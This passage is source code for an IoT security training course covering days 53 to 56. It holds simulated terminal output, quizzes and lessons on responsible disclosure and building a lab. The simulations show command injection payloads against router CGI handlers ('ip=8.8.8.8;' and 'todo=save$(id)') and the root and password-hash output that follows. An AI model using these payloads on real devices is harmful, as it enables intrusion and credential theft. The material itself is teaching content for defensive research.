          if (args.includes("tp-link") || args.includes("firmware")) return "--2024-11-15 09:23:11--  https://www.tp-link.com/firmware/TL-WRXXX_V1_firmware.bin\nResolving www.tp-link.com... 23.47.52.41\nConnecting to www.tp-link.com|23.47.52.41|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 8,388,608 (8.0M) [application/octet-stream]\nSaving to: 'TL-WRXXX_V1_firmware.bin'\n\nTL-WRXXX_V1_firmware 100%[===================>]   8.00M  2.45MB/s    in 3.3s\n\n2024-11-15 09:23:14 (2.45 MB/s) - 'TL-WRXXX_V1_firmware.bin' saved [8388608/8388608]\n\n[INFO] Firmware downloaded. No hardware needed — vendor hosts updates publicly.";
          return "wget: missing URL";
        },
        binwalk: (args: string) => {
          if (args.includes("-e")) return "DECIMAL       HEXADECIMAL     DESCRIPTION\n-----------------------------------------------------------------------\n0             0x0             TP-Link firmware header, model: TL-WRXXX v1\n512           0x200           U-Boot bootloader, version 1.1.4\n65536         0x10000         LZMA compressed data\n1048576       0x100000        Squashfs filesystem, little endian, version 4.0\n                              compression: LZMA, 6.2MB\n7340032       0x700000        JFFS2 filesystem (user config)\n\nExtracting...\n  > squashfs-root/\n    > bin/ dev/ etc/ lib/ sbin/ usr/ var/ www/\n  Extraction complete.\n\n[INFO] Standard TP-Link Linux firmware layout.\n[INFO] Web interface is in squashfs-root/www/";
          return "Usage: binwalk [-e] <firmware_file>";
        },
        ls: (args: string) => {
          if (args.includes("cgi-bin")) return "admin.cgi      config.cgi     diag.cgi       firmware.cgi\nlogin.cgi      network.cgi    reboot.cgi     status.cgi\nupgrade.cgi    wireless.cgi   qos.cgi        ddns.cgi\n\n[NOTE] 12 CGI handlers found. Each one processes HTTP parameters\n       and may pass user input to system commands.\n[PRIORITY] diag.cgi — diagnostic tools (ping/traceroute) are the\n           most common source of command injection in routers.";
          if (args.includes("squashfs")) return "bin  dev  etc  lib  sbin  usr  var  www";
          return "TL-WRXXX_V1_firmware.bin  squashfs-root/";
        },
        "ghidra-decompile": (args: string) => {
          if (args.includes("diag")) return "Ghidra Decompilation: diag.cgi\nArchitecture: MIPS32 big-endian\n========================================\n\nvoid handle_ping_request(void) {\n    char cmd_buffer[256];\n    char *ip_param;\n    char *auth_cookie;\n    \n    auth_cookie = getenv(\"HTTP_COOKIE\");\n    if (check_auth(auth_cookie) == 0) {\n        printf(\"Content-Type: text/html\\n\\n\");\n        printf(\"<h1>Authentication Required</h1>\");\n        return;\n    }\n    \n    ip_param = get_post_param(\"ip\");\n    \n    // [VULNERABILITY] No input validation on ip_param\n    // User input goes directly into command string\n    sprintf(cmd_buffer, \"/bin/ping -c 4 %s 2>&1\", ip_param);\n    \n    // [CRITICAL] system() executes the string as a shell command\n    // Semicolons, backticks, $(), and pipes are all interpreted\n    FILE *fp = popen(cmd_buffer, \"r\");\n    \n    char result[4096];\n    fread(result, 1, sizeof(result), fp);\n    pclose(fp);\n    \n    printf(\"Content-Type: text/html\\n\\n\");\n    printf(\"<pre>%s</pre>\", result);\n}\n\n[ANALYSIS]\n  Input source: HTTP POST parameter 'ip'\n  Sink: popen() via sprintf() → shell command execution\n  Sanitization: NONE\n  Authentication: Cookie-based (required, but bypassable on LAN)\n  Verdict: OS COMMAND INJECTION (CWE-78)\n  Payload: ip=8.8.8.8;[arbitrary_command]";
          return "Usage: ghidra-decompile <binary>";
        },
        curl: (args: string) => {
          if (args.includes("id") && args.includes("diag")) return "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<pre>PING 8.8.8.8 (8.8.8.8): 56 data bytes\n64 bytes from 8.8.8.8: seq=0 ttl=118 time=11.234 ms\n\nuid=0(root) gid=0(root)\n</pre>\n\n[+] COMMAND INJECTION CONFIRMED\n[+] Running as root — no privilege escalation needed.\n[+] The semicolon (;) terminated the ping command.\n[+] 'id' executed as a separate command with root privileges.";
          if (args.includes("shadow") && args.includes("diag")) return "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<pre>PING 8.8.8.8 (8.8.8.8): 56 data bytes\n64 bytes from 8.8.8.8: seq=0 ttl=118 time=10.891 ms\n\nroot:$1$GTN.gpci$6yrqGaBwPGBBPY0Dxpj8h0:18000:0:99999:7:::\nadmin:$1$MQzN52mP$r7oXJhp4VFRjH8M32gDfu0:18000:0:99999:7:::\nnobody:*:0:0:99999:7:::\n</pre>\n\n[+] Password hashes extracted successfully.\n[+] These MD5crypt hashes are crackable with hashcat.\n[+] Full exploit chain: download firmware → extract → find vuln → exploit\n[+] No hardware required. No physical access to device needed.\n[+] CVE-2024-54887 assigned. TP-Link patched in firmware v1.0.2.";
          return `curl: connection refused`;
        },
        help: () => "Available commands: wget, binwalk, ls, ghidra-decompile, curl, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "In the TP-Link command injection vulnerability, the code uses: sprintf(cmd, \"/bin/ping -c 4 %s\", user_input); popen(cmd, \"r\"); What is the correct fix?",
      options: [
        { label: "A", value: "Use a longer buffer to prevent overflow" },
        { label: "B", value: "Add HTTPS to encrypt the web interface traffic" },
        { label: "C", value: "Validate that user_input contains only digits and dots (allowlist), or use execve() with an argument array instead of shell command strings" },
        { label: "D", value: "Remove the diagnostic page entirely — users don't need ping functionality" },
      ],
      correct: "C",
      explanation: "The fix has two parts: (1) Input validation with an allowlist — for an IP address field, only allow digits, dots, and colons (for IPv6). Reject any input containing semicolons, pipes, backticks, dollar signs, or other shell metacharacters. (2) Use execve() or equivalent with an argument array instead of system()/popen() — this bypasses the shell entirely, so metacharacters have no special meaning. Both approaches are defense-in-depth; using them together is best practice.",
    },
    output: "Today you walked through a real-world 0-day discovery — from firmware download to CVE — demonstrating that the most common router vulnerability (command injection in diagnostic CGI handlers) can be found with free tools and the systematic methodology you've been learning.",
    homework: [
      {
        title: "Exploiting TP-Link Routers (0reg.dev)",
        url: "https://0reg.dev/blog/hacking-a-router-tenda-ac8-v4-stack-overflow-pocs?s=35",
        description: "Complete walkthrough of discovering and exploiting a stack overflow in router firmware — from reverse engineering to working PoC."
      },
      {
        title: "Hardware Reversing with TP-Link TL-WR841N",
        url: "https://www.zerodayinitiative.com/blog/2019/9/2/mindshare-hardware-reversing-with-the-tp-link-tl-wr841n-router",
        description: "Zero Day Initiative's comprehensive guide to hardware reversing using one of the world's most popular routers as the target."
      },
      {
        title: "Analysis of TP-Link Archer A7 Vulnerability",
        url: "https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo",
        description: "Star Labs' deep analysis of another TP-Link vulnerability — demonstrating that the same vulnerability patterns repeat across product lines."
      }
    ],
  },
  {
    day: 54,
    title: "Responsible Disclosure & Bug Bounties",
    hook: "You found a vulnerability. Your heart is racing. You can read every password on the device. You could access the admin panel of thousands of routers worldwide. Now what? This moment — right now — is the fork in the road. On one side: sell the exploit on a dark web marketplace for $50,000. On the other: report it to the vendor, get a CVE assigned, maybe earn a bug bounty, and protect millions of users. The difference between a criminal and a security researcher isn't the skills or the tools. It's what happens in this moment. Responsible disclosure is the ethical framework that makes security research legal, respected, and effective. It's also how you build a career: a published CVE with your name on it is worth more than any underground reputation. Companies hire researchers who break things responsibly. Today you'll learn the disclosure timeline, the legal landscape, and how to turn vulnerability research into a legitimate career.",
    lesson: [
      "Responsible disclosure (also called coordinated disclosure) follows a structured timeline. Day 0: you discover the vulnerability and document it thoroughly — affected versions, reproduction steps, impact assessment, and proof-of-concept. Day 1: you report it to the vendor through their security contact (usually security@vendor.com or a bug bounty platform). You give them a reasonable deadline — typically 90 days — to develop and deploy a patch before you publish anything publicly.",
      "During the disclosure period, you work with the vendor. They may ask questions, request additional details, or need help understanding the impact. Professional researchers provide clear, actionable reports: what the vulnerability is, how to reproduce it, what the impact is, and ideally, how to fix it. You request a CVE (Common Vulnerabilities and Exposures) number from MITRE or the vendor's CNA (CVE Numbering Authority). The CVE becomes the permanent identifier for the vulnerability.",
      "Bug bounty platforms like HackerOne, Bugcrowd, and vendor-specific programs (ZDI, Google VRP, Microsoft MSRC) formalize this process. They define scope (what you're allowed to test), rules of engagement (no DoS, no data exfiltration from production systems), and reward tiers based on severity. Router manufacturers like TP-Link, Netgear, and ASUS have disclosure programs, though bounty amounts for consumer networking equipment are typically lower than web application bounties. Pwn2Own offers the highest payouts — $50,000-$300,000 per exploit — but requires demonstrating the exploit live on stage.",
      "The legal landscape matters. In the US, the Computer Fraud and Abuse Act (CFAA) makes unauthorized access to computers a federal crime. Security research on devices you own is generally protected, but testing vulnerabilities on production systems you don't own crosses the line. Always test on your own devices or in lab environments. Document your methodology to prove responsible intent. And never threaten a vendor with public disclosure to extract a bounty — that's extortion. The professional path is slower but sustainable: build a portfolio of CVEs, present at conferences, contribute to the community, and opportunities follow."
    ],
    exercise: {
      type: "input",
      prompt: "You've discovered a critical command injection vulnerability in a popular home router. Write the responsible disclosure timeline — list the 4 key phases in order:\n\n1. Discovery & documentation\n2. ???\n3. ???\n4. ???\n\nDescribe what happens at each phase (include: vendor notification, CVE request, and public disclosure):",
      placeholder: "Describe the 4 phases of your disclosure timeline...",
      validator: (input: string) => {
        const lower = input.toLowerCase();
        const hasVendor = lower.includes("vendor") || lower.includes("report") || lower.includes("notif");
        const hasCVE = lower.includes("cve") || lower.includes("mitre") || lower.includes("identifier");
        const hasPublic = lower.includes("public") || lower.includes("publish") || lower.includes("disclos");
        const hasPatch = lower.includes("patch") || lower.includes("fix") || lower.includes("update") || lower.includes("remediat");

        if (hasVendor && hasCVE && hasPublic) {
          return { correct: true, hint: "Excellent! A proper disclosure timeline covers: (1) Discovery and thorough documentation with PoC, (2) Vendor notification with a deadline (typically 90 days), (3) CVE request and coordination while the vendor develops a patch, (4) Public disclosure after the patch is available or the deadline expires. This protects users while giving vendors fair time to respond." };
        }
        if (hasVendor && hasPublic) {
          return { correct: true, hint: "Good structure! You've covered vendor notification and public disclosure. Don't forget requesting a CVE number from MITRE — it creates a permanent, searchable record of the vulnerability. The standard timeline is: discover → notify vendor (with 90-day deadline) → request CVE → public disclosure after patch." };
        }
        if (hasVendor || hasPatch) {
          return { correct: false, hint: "You're on the right track with vendor notification. A complete timeline needs: (1) Document the vulnerability with a PoC, (2) Notify the vendor and set a 90-day deadline, (3) Request a CVE identifier, (4) Publicly disclose after the patch is released or the deadline expires." };
        }
        return { correct: false, hint: "Think about the steps: after you find the bug and document it, who do you tell first? How long do you give them? What identifier do you request? When do you go public? The key milestones are: vendor notification, CVE request, and public disclosure." };
      },
    },
    quiz: {
      question: "A researcher finds a critical vulnerability and the vendor stops responding after 60 days with no patch released. What is the standard professional approach?",
      options: [
        { label: "A", value: "Publish the full exploit immediately to pressure the vendor" },
        { label: "B", value: "Wait the full 90-day deadline, then publish a limited advisory (description + impact) without a working exploit, and coordinate with CERT/CC if the vendor remains unresponsive" },
        { label: "C", value: "Sell the exploit to a broker since the vendor isn't cooperating" },
        { label: "D", value: "Drop the research entirely and never disclose the vulnerability" },
      ],
      correct: "B",
      explanation: "The standard practice is to honor the original deadline (typically 90 days), then publish an advisory that describes the vulnerability and its impact without including a full working exploit. This pressures the vendor to patch while giving users the information they need to mitigate risk. If the vendor is completely unresponsive, escalating to a coordination center like CERT/CC helps — they have established relationships with vendors and can apply additional pressure. Google's Project Zero and ZDI follow this model, and it's considered the gold standard for responsible disclosure.",
    },
    output: "Today you learned the responsible disclosure process — from documentation to vendor notification to CVE assignment to public disclosure — and how ethical vulnerability research builds careers while protecting users.",
    homework: [
      {
        title: "Exploiting the Sonos One Speaker Three Ways",
        url: "https://www.zerodayinitiative.com/blog/2023/5/24/exploiting-the-sonos-one-speaker-three-different-ways-a-pwn2own-toronto-highlight",
        description: "ZDI highlights three independent exploit chains against the Sonos One from Pwn2Own Toronto — showcasing how responsible disclosure leads to published research and industry recognition."
      },
      {
        title: "TeamT5 Pwn2Own Contest Experience Sharing",
        url: "https://teamt5.org/en/posts/teamt5-pwn2own-contest-experience-sharing-and-vulnerability-demonstration/",
        description: "TeamT5 shares their Pwn2Own experience — from target selection through disclosure to demonstration, providing insight into the professional competition workflow."
      }
    ],
  },
  {
    day: 55,
    title: "Building Your Own IoT Security Lab",
    hook: "You don't need $10,000 in equipment to start IoT security research. A $3 USB-to-serial adapter from AliExpress, a $5 CH341A SPI flash programmer, and a $15 thrift store router is enough to practice everything you've learned in this course. The researchers who present at DEF CON and compete at Pwn2Own didn't start with laser fault injection rigs and Faraday cages. They started with a soldering iron, a cheap logic analyzer, and a pile of broken routers. The most important tool isn't hardware — it's patience and methodology. Today you'll learn what to buy first, what to buy later, where to find practice targets, and how to set up a lab that lets you safely practice hardware hacking, firmware analysis, and wireless protocol testing without risking your home network or violating any laws.",
    lesson: [
      "Tier 1 — The Starter Kit (under $50): A USB-to-serial adapter (CP2102 or FTDI FT232, $3-8) for UART connections. A CH341A SPI flash programmer ($5) for firmware dumps. A set of IC hook clips or a SOIC-8 test clip ($3-5) for connecting to flash chips without soldering. A basic soldering iron with fine tips ($15-25). And most importantly: a target device — buy a used router, camera, or smart plug from a thrift store, garage sale, or electronics recycler. Total cost: $30-50.",
      "Tier 2 — The Intermediate Lab ($50-200): A logic analyzer (Saleae Logic clone or DSLogic, $10-50) for decoding SPI, I2C, and UART signals. A Bus Pirate ($30) for multi-protocol interfacing. A Raspberry Pi ($35-70) as a JTAG/SWD debugger and for running firmware emulation. A multimeter ($15-30) for identifying pins and voltages. An SDR dongle (RTL-SDR, $25) for wireless protocol analysis. A second monitor or dedicated laptop for your lab bench.",
      "Tier 3 — The Advanced Setup ($200-1000+): A JTAGulator ($150) for automated JTAG pin identification. A Proxmark3 ($60-120) for NFC/RFID research. A ChipWhisperer Nano ($50) or Husky ($250) for fault injection. A HackRF ($300) or YARD Stick One ($100) for sub-GHz radio analysis. A hot air rework station ($50-100) for desoldering components. A USB CAN adapter ($15-60) for automotive research. A dedicated lab network (separate router, isolated VLAN) for safely testing live devices.",
      "Where to find practice targets: thrift stores and garage sales (routers, cameras, smart home devices for $1-15), e-waste recyclers (often give away broken electronics for free), your own old devices (that WiFi extender in the drawer), and firmware images online (many vendors host updates publicly). For legal practice, use intentionally vulnerable firmware like OWASP IoT Goat and DVRF. Never test on devices you don't own. Set up your lab on an isolated network segment — an old router creating a separate WiFi network with no internet access is perfect."
    ],
    exercise: {
      type: "choice",
      prompt: "You have $75 to start your IoT security lab. You want to be able to: connect to UART consoles, dump SPI flash chips, and analyze one target device. Which combination gives you the best coverage?",
      choices: [
        "A JTAGulator ($150) — it does everything but costs more than your budget",
        "USB-to-serial adapter ($5) + CH341A programmer ($5) + SOIC-8 clip ($4) + soldering iron ($20) + thrift store router ($10) + multimeter ($20) = $64",
        "A HackRF One ($300) for wireless analysis",
        "A professional Saleae Logic Pro ($500) logic analyzer"
      ],
      validator: (input: string) => {
        const choice = input.trim().toUpperCase();
        if (choice === "B") {
          return { correct: true, hint: "Correct! For $64, you have everything needed to practice the core skills: UART for console access, SPI dumping for firmware extraction, a soldering iron for hardware modifications, a multimeter for pin identification, and a real target device to practice on. This kit lets you follow along with every firmware analysis technique from Weeks 2-4 of this course. Buy the logic analyzer and Proxmark3 later, once you've exhausted what you can learn with the basics." };
        }
        if (choice === "A") {
          return { correct: false, hint: "The JTAGulator is excellent for JTAG pin identification, but at $150 it exceeds your budget and doesn't cover UART or SPI flash dumping. Start with the basics — you won't need automated JTAG scanning until you're working with devices where pins aren't labeled." };
        }
        if (choice === "C") {
          return { correct: false, hint: "A HackRF is for RF/wireless analysis — useful later for BLE, Zigbee, or sub-GHz protocols. But at $300 it's way over budget, and wireless analysis is an advanced skill. Start with wired interfaces (UART, SPI) first." };
        }
        if (choice === "D") {
          return { correct: false, hint: "A professional Saleae Logic Pro is an amazing tool, but at $500 it's far over budget. A $10-20 logic analyzer clone provides the same basic functionality for learning. The professional version is for when you need precise timing measurements at high speeds." };
        }
        return { correct: false, hint: "Choose A, B, C, or D. Think about which combination covers UART, SPI, and a target device within $75." };
      },
    },
    quiz: {
      question: "Why is it important to set up your IoT security lab on an isolated network segment?",
      options: [
        { label: "A", value: "Isolated networks are faster because they have less traffic" },
        { label: "B", value: "If a device you're testing is compromised (or has malware/backdoors), the isolated network prevents it from accessing your personal devices, home network, or the internet" },
        { label: "C", value: "ISPs require separate networks for security research by law" },
        { label: "D", value: "Isolated networks automatically record all traffic for analysis" },
      ],
      correct: "B",
      explanation: "Devices you're testing may have active backdoors (like the SerComm port 32764 backdoor from Week 2), phone-home capabilities that report to the manufacturer, or even active malware infections. On an isolated network, a compromised device can't reach your personal computers, exfiltrate data through your internet connection, or probe other devices on your home network. An old router creating a separate WiFi/LAN with no WAN connection is the simplest setup. For advanced testing, VLANs and firewall rules provide more granular control.",
    },
    output: "Today you learned how to build a practical IoT security lab on any budget — from a $50 starter kit to an advanced setup — and where to find legal practice targets to sharpen your skills.",
    homework: [
      {
        title: "Hardware All The Things",
        url: "https://swisskyrepo.github.io/HardwareAllTheThings/",
        description: "Community-maintained reference covering every hardware hacking technique — UART, JTAG, SPI, fault injection, and more, in cheatsheet format."
      },
      {
        title: "HardBreak — Hardware Hacking Wiki",
        url: "https://www.hardbreak.wiki/",
        description: "Comprehensive wiki for hardware security researchers — covers tools, techniques, chip databases, and lab setup guides."
      },
      {
        title: "Basics of Hardware Hacking",
        url: "https://maldroid.github.io/hardware-hacking/",
        description: "Beginner-friendly guide to setting up your first hardware hacking lab — covers equipment selection, safety, and first projects."
      }
    ],
  },
  {
    day: 56,
    title: "Final Capstone — Your Research Roadmap",
    hook: "Eight weeks ago, you started by spotting a phishing URL. Today, you can dump firmware from a flash chip, reverse-engineer a binary in Ghidra, trace a command injection vulnerability through decompiled code, analyze CAN bus traffic, assess BLE security, and chain multiple vulnerabilities into a working exploit. You've studied real Pwn2Own exploit chains against Netgear routers and Tesla chargers. You've learned the professional methodology that separates hobbyists from researchers. But knowledge without application fades. This final capstone is about building your research roadmap — a concrete plan for what you'll hack next, what you'll study deeper, and how you'll contribute to the security community. The IoT security field is growing faster than the researcher pool. Every smart device that ships is another target waiting for someone with your skills to audit it. The question isn't whether there are vulnerabilities to find — there are millions. The question is: what will you research first?",
    lesson: [
      "Let's review the complete skill stack you've built across eight weeks. Weeks 1-2: security fundamentals and embedded systems — phishing, social engineering, networking, terminal skills, and the anatomy of embedded devices. Weeks 3-4: firmware extraction and analysis — UART, JTAG, SPI dumping, binwalk extraction, static analysis with strings and grep, and emulation with QEMU. Weeks 5-6: reverse engineering and exploitation — Ghidra, binary analysis, vulnerability classes (command injection, buffer overflow, authentication bypass), and exploit development.",
      "Weeks 7-8: wireless protocols and professional methodology — BLE, WiFi, CAN bus, NFC, Zigbee, fault injection, and the six-phase assessment methodology. You've studied three Pwn2Own case studies (Netgear RAX30, Tesla Wall Connector, TP-Link routers) and learned responsible disclosure. This is a complete foundation — but it's only a foundation. Every topic you've touched has entire specializations within it: binary exploitation alone is a multi-year deep dive.",
      "Your next steps depend on your goals. For bug bounties: pick one device category (routers, cameras, or smart home hubs), buy three different brands, and methodically apply the firmware analysis workflow to each. Most routers have unfound command injection bugs. For Pwn2Own preparation: study every published write-up from previous competitions (the homework links throughout this course are your reading list), choose a target category from the upcoming contest, and start researching months in advance. For career development: document your research in blog posts, present at local security meetups, contribute to open-source tools (binwalk, Ghidra plugins, EMBA), and build a portfolio of CVEs.",
      "The IoT security community is welcoming and collaborative. Follow researchers on Twitter/X and Mastodon (names you've encountered: Synacktiv, Claroty Team82, Star Labs, NCC Group, Ret2 Systems). Join the Hardware Hacking Village at DEF CON. Participate in CTF competitions that include IoT/embedded challenges. Share your research — even writing up how you analyzed a $5 thrift store router teaches others and builds your reputation. The fact that you completed this course means you have more embedded security knowledge than 99% of security professionals. Now go find something to break — responsibly."
    ],
    exercise: {
      type: "terminal",
      prompt: "Final capstone: simulate a complete research workflow from device selection to vulnerability disclosure.\n• research-target --list-categories\n• research-target --select router --model \"Netgear R7000\"\n• firmware-workflow --phase recon\n• firmware-workflow --phase extract\n• firmware-workflow --phase analyze\n• firmware-workflow --phase exploit\n• disclosure --generate-report\n• disclosure --submit-cve",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        "research-target": (args: string) => {
          if (args.includes("--list-categories")) return "Available IoT Research Target Categories\n========================================\n\n  [1] Home Routers & Access Points\n      Market size: ~500M devices worldwide\n      Common vulns: command injection, auth bypass, hardcoded creds\n      Difficulty: Beginner-Intermediate\n      Bug bounty: $500-$5,000 per vulnerability\n      Pwn2Own payout: $20,000-$100,000\n\n  [2] IP Cameras & NVRs\n      Market size: ~200M devices\n      Common vulns: RTSP overflow, web interface injection, default creds\n      Difficulty: Beginner-Intermediate\n      Bug bounty: $200-$2,000\n\n  [3] Smart Home Hubs & IoT Gateways\n      Market size: ~100M devices\n      Common vulns: Zigbee/Z-Wave key extraction, cloud API abuse\n      Difficulty: Intermediate\n      Bug bounty: $500-$5,000\n\n  [4] Automotive (ECUs, Infotainment, Chargers)\n      Market size: ~1.4B vehicles + growing EV infrastructure\n      Common vulns: CAN injection, UDS auth bypass, PLC overflow\n      Difficulty: Intermediate-Advanced\n      Pwn2Own payout: $50,000-$200,000\n\n  [5] Industrial IoT / OT Devices\n      Market size: ~50M devices\n      Common vulns: protocol abuse, firmware manipulation, weak auth\n      Difficulty: Advanced\n      Bug bounty: $5,000-$50,000";
          if (args.includes("--select") && args.includes("router")) return "Target Selected: Netgear R7000 (Nighthawk)\n========================================\n\n  Chipset: Broadcom BCM4709A0 (ARM Cortex-A9)\n  Flash: 128MB NAND\n  RAM: 256MB DDR3\n  WiFi: BCM4360 (5GHz) + BCM4331 (2.4GHz)\n  OS: Linux 2.6.36 / NetBSD-based firmware\n\n  Attack surface:\n    - Web management interface (port 80/443)\n    - UPnP service (port 5000)\n    - ReadySHARE USB (SMB/FTP)\n    - NETGEAR genie app API (SOAP)\n    - Remote management (if enabled)\n\n  Prior research: 47 CVEs in National Vulnerability Database\n  Firmware: Available at https://www.netgear.com/support/\n  FCC ID: PY314200233 (internal photos available)\n\n  [READY] Proceed with firmware-workflow --phase recon";
          return "Usage: research-target --list-categories | --select <category> --model <name>";
        },
        "firmware-workflow": (args: string) => {
          if (args.includes("recon")) return "Phase 1: Reconnaissance\n========================================\n\n  [*] Downloading firmware from vendor website...\n      R7000-V1.0.11.134_10.2.120.zip (32.4 MB) [DONE]\n\n  [*] Checking FCC database for internal photos...\n      FCC ID: PY314200233\n      Internal photos: PCB top/bottom, IC markings visible [FOUND]\n      Key ICs: BCM4709A0 SoC, Spansion S34ML01G2 (NAND flash)\n\n  [*] Searching CVE database...\n      47 prior CVEs found (2014-2024)\n      Most common: command injection (12), auth bypass (8), info leak (7)\n      Latest patch: V1.0.11.134 (our firmware version)\n\n  [*] Checking open-source components...\n      BusyBox v1.25.1 — 3 known CVEs applicable\n      dnsmasq 2.78 — 2 known CVEs applicable\n      OpenSSL 1.0.2k — 7 known CVEs applicable (outdated!)\n      miniupnpd 2.1 — 1 known CVE applicable\n\n  [COMPLETE] Recon gathered. Proceed to extraction.";
          if (args.includes("extract")) return "Phase 2: Firmware Extraction & Unpacking\n========================================\n\n  [*] Analyzing firmware image...\n      $ binwalk R7000-V1.0.11.134.chk\n      0x3A         TRX firmware header\n      0x1C         LZMA compressed data\n      0x1E0000     Squashfs filesystem, version 4.0\n\n  [*] Extracting filesystem...\n      $ binwalk -e R7000-V1.0.11.134.chk\n      Extracted squashfs-root/ (1,847 files)\n\n  [*] Filesystem summary:\n      Architecture: ARM 32-bit (Little Endian)\n      Root filesystem: SquashFS (read-only)\n      Web interface: /www/ (42 CGI binaries)\n      Config files: /etc/ (23 configuration files)\n      Custom binaries: /usr/sbin/ (18 Netgear-specific executables)\n      Init scripts: /etc/init.d/ (12 startup scripts)\n\n  [*] Quick wins:\n      /etc/passwd: root:x:0:0:root:/root:/bin/sh\n      /tmp/etc/shadow: [generated at runtime, not in firmware]\n      /www/cgi-bin/: 42 potential command injection targets\n\n  [COMPLETE] Filesystem extracted. Proceed to analysis.";
          if (args.includes("analyze")) return "Phase 3: Static Analysis & Vulnerability Discovery\n========================================\n\n  [*] Running firmwalker automated checks...\n      Hardcoded IPs found: 4\n      Email addresses found: 2\n      URLs found: 34 (cloud endpoints, update servers)\n      Potential credentials: 3 (admin/password patterns)\n\n  [*] Analyzing CGI binaries with Ghidra...\n      Loaded 42 CGI binaries (ARM 32-bit LE)\n\n      [FINDING 1] setup.cgi:\n        HTTP parameter 'todo' passed to system() at 0x00012A40\n        Sanitization: partial (blocks ';' but NOT '$()')\n        VERDICT: Command injection via $(command) syntax\n        Severity: HIGH (CWE-78)\n\n      [FINDING 2] upgrade_check.cgi:\n        Firmware download URL constructed from user input\n        No HTTPS enforcement, no signature verification\n        VERDICT: Man-in-the-middle firmware replacement\n        Severity: HIGH (CWE-494)\n\n      [FINDING 3] genie_restoring.cgi:\n        Config restore accepts .cfg files\n        Parser uses sscanf() with no bounds check\n        VERDICT: Stack buffer overflow in config parser\n        Severity: CRITICAL (CWE-121)\n\n  [COMPLETE] 3 vulnerabilities found. Proceed to exploitation.";
          if (args.includes("exploit")) return "Phase 4: Exploitation & Verification\n========================================\n\n  [*] Developing PoC for FINDING 1 (command injection)...\n\n      Target: POST /cgi-bin/setup.cgi\n      Parameter: todo\n      Payload: todo=save$(id)\n      Expected: command substitution executes 'id' on device\n\n      [*] Testing on emulated firmware (QEMU ARM)...\n      [+] CONFIRMED: uid=0(root) gid=0(root) returned in response\n      [+] Works on emulated firmware V1.0.11.134\n\n      [*] Testing on physical device...\n      [+] CONFIRMED: Same result on physical Netgear R7000\n      [+] Authenticated: YES (requires valid session cookie)\n      [+] Pre-auth: NO (login required)\n      [+] Impact: Authenticated RCE as root\n\n  [*] Developing PoC for FINDING 3 (buffer overflow)...\n      [+] Crash confirmed at offset 1024 of cfg filename field\n      [+] Return address control achieved at offset 1036\n      [+] ROP chain developed using libc gadgets\n      [+] CONFIRMED: Unauthenticated code execution via config restore\n\n  [COMPLETE] 2 working exploits developed. Proceed to disclosure.";
          return "Usage: firmware-workflow --phase [recon|extract|analyze|exploit]";
        },
        disclosure: (args: string) => {
          if (args.includes("--generate-report")) return "Vulnerability Disclosure Report\n========================================\n\nTitle: Multiple Vulnerabilities in Netgear R7000 Firmware V1.0.11.134\nResearcher: [Your Name]\nDate: 2026-05-01\n\nVulnerability 1: Authenticated Command Injection in setup.cgi\n  CVSSv3: 8.8 (High)\n  CWE: CWE-78 (OS Command Injection)\n  Affected: Netgear R7000 firmware <= V1.0.11.134\n  Description: The 'todo' parameter in setup.cgi is passed to\n    system() with incomplete sanitization. Semicolons are filtered\n    but command substitution $() is not, allowing authenticated\n    users to execute arbitrary commands as root.\n  Reproduction: POST /cgi-bin/setup.cgi with todo=save$(id)\n  Impact: Any authenticated user (including guest accounts) can\n    execute arbitrary commands with root privileges.\n  Remediation: Use exec() with argument arrays instead of system().\n    Alternatively, implement an allowlist for the 'todo' parameter.\n\nVulnerability 2: Unauthenticated Stack Overflow in genie_restoring.cgi\n  CVSSv3: 9.8 (Critical)\n  CWE: CWE-121 (Stack-based Buffer Overflow)\n  [Full details in report...]\n\n[REPORT GENERATED] report_netgear_r7000_2026.pdf";
          if (args.includes("--submit-cve")) return "CVE Submission Process\n========================================\n\n  [*] Submitting to Netgear security team...\n      Contact: security@netgear.com\n      Bug bounty program: https://bugcrowd.com/netgear\n      Deadline: 90 days from notification (2026-07-30)\n      [SENT] Report delivered with full PoC and remediation advice.\n\n  [*] Requesting CVE from MITRE...\n      Submission: https://cveform.mitre.org/\n      Type: Software vulnerability\n      Vendor: Netgear\n      Product: R7000\n      Vulnerabilities: 2 (requesting 2 CVE IDs)\n      [SUBMITTED] Awaiting CVE assignment.\n\n  [*] Timeline:\n      2026-05-01: Vulnerability discovered\n      2026-05-01: Vendor notified (90-day deadline)\n      2026-05-15: CVE-2026-XXXXX and CVE-2026-XXXXY assigned\n      2026-06-15: Vendor acknowledges and begins patch development\n      2026-07-15: Patch released in firmware V1.0.11.140\n      2026-07-30: Public disclosure with full write-up\n\n  Congratulations! You've completed the full research lifecycle.\n  Your CVEs are permanently searchable in the NVD.\n  This is how careers in security research are built.";
          return "Usage: disclosure --generate-report | --submit-cve";
        },
        help: () => "Available commands: research-target, firmware-workflow, disclosure, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "Across all 8 weeks of this course, which principle has been the most consistent theme in professional IoT security research?",
      options: [
        { label: "A", value: "The most expensive tools always produce the best results" },
        { label: "B", value: "Systematic methodology — reconnaissance before extraction, static analysis before dynamic, documentation throughout — turns individual skills into repeatable, professional results" },
        { label: "C", value: "IoT devices are too simple to contain serious vulnerabilities" },
        { label: "D", value: "Only hardware attacks matter; software vulnerabilities in IoT are rare" },
      ],
      correct: "B",
      explanation: "From Day 1's phishing detection to Day 56's complete research workflow, the consistent message has been: methodology beats talent. The Pwn2Own teams that win don't have secret tools — they have systematic processes. Reconnaissance before extraction. Static analysis before dynamic. Documentation throughout. Responsible disclosure after exploitation. Every case study you've studied (Netgear RAX30, Tesla Wall Connector, TP-Link routers) followed the same phases. The tools change, the targets change, but the methodology is universal. That's what you take with you from this course.",
    },
    output: "Congratulations — you've completed the full IoT Security Research course! Over 56 days, you built a complete skill stack: from spotting phishing URLs to chaining real-world exploit chains. You now have the methodology, the technical foundation, and the ethical framework to contribute to IoT security research. The field needs you. Go find a device, apply the workflow, and make the connected world safer. Welcome to the community, researcher.",
    homework: [
      {
        title: "OWASP IoT Goat",
        url: "https://github.com/OWASP/IoTGoat",
        description: "A deliberately vulnerable firmware image designed for practicing the full analysis workflow — extract, analyze, and exploit in a safe learning environment."
      },
      {
